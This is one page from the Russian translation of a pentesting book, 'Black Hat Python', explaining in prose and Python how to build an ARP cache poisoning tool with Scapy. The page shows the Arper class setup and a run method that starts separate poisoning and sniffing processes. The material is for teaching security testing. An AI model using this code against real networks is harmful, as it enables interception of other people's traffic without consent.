# Black Hat Python. Программирование для хакеров и пентестеров — страница 82

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

82   Глава 4. Захват сети с помощью Scapy
Мы передаем IP-адрес и создаем пакет . Функция Ether делает так, что
этот пакет будет передаваться по широковещательному каналу , а функция
ARP определяет запрос, который, будучи послан по заданному MAC-адресу ,
спрашивает у каждого сетевого узла о наличии IP-адреса жертвы. Пакет от-
правляется с помощью функции srp  из состава Scapy , которая передает
и принимает пакеты на втором, канальном уровне. Присваиваем ответ пере-
менной resp, которая в итоге должна будет содержать источник уровня Ether
(MAC-адрес) для IP-адреса жертвы.
Т еперь займемся написанием класса Arper:
class Arper():
    def __init__(self, victim, gateway, interface='en0'): 
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:') 
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)
При инициализации этого класса мы указываем IP-адреса жертвы и шлюза,
а также сетевой интерфейс, который будет использоваться (en0 по умолча-
нию) . Имея эту информацию, инициализируем переменные interface ,
victim, victimmac, gateway и gatewaymac, выводя значения в консоль .
Создадим внутри класса Arper функцию run, которая будет служить точкой
входа для атаки:
def run(self):
    self.poison_thread = Process(target=self.poison) 
    self.poison_thread.start()
    self.sniff_thread = Process(target=self.sniff) 
    self.sniff_thread.start()
Основная работа на объектe Arper ложится на метод run. Он подготавливает
и выполняет два процесса: один для подмены ARP-кэша , а другой для того,
чтобы мы могли наблюдать за проведением атаки путем анализа сетевого
трафика .
